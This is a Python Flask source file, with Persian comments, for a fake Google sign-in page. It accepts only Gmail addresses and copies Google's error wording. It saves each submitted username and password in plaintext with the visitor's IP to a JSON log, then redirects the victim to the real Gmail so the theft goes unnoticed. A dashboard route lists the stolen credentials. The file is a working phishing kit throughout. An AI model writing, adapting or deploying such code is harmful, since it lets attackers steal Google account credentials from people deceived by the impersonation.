from flask import Blueprint, render_template, request, redirect
import json
from datetime import datetime
import os
import re

bp = Blueprint('main', __name__)
DATA_FILE = 'database/logs.json'

# اطمینان از وجود فایل JSON
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'w') as f:
        json.dump([], f)

# Regex برای Gmail فقط
email_regex = r'^[a-zA-Z0-9._%+-]+@gmail\.com$'

@bp.route('/', methods=['GET'])
def index():
    return render_template('login.html')

@bp.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr
    timestamp = datetime.utcnow().isoformat()

    # بررسی معتبر بودن ایمیل
    if not re.match(email_regex, username):
        error_msg = "Couldn't find your Google Account. Please try again or create a new account."
        return render_template('login.html', error=error_msg)

    # خواندن داده‌ها با محافظت در برابر JSONDecodeError
    with open(DATA_FILE, 'r') as f:
        try:
            data = json.load(f)
        except json.JSONDecodeError:
            data = []

    log_entry = {
        "id": len(data)+1,
        "username": username,
        "password": password,
        "ip": ip,
        "timestamp": timestamp
    }
    data.append(log_entry)

    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

    return redirect("https://mail.google.com")  # ریدایرکت به Gmail واقعی

@bp.route('/dashboard', methods=['GET'])
def dashboard():
    with open(DATA_FILE, 'r') as f:
        try:
            logs = json.load(f)
        except json.JSONDecodeError:
            logs = []

    success_count = len(logs)
    fail_count = 0

    return render_template('dashboard.html', logs=logs, success_count=success_count, fail_count=fail_count)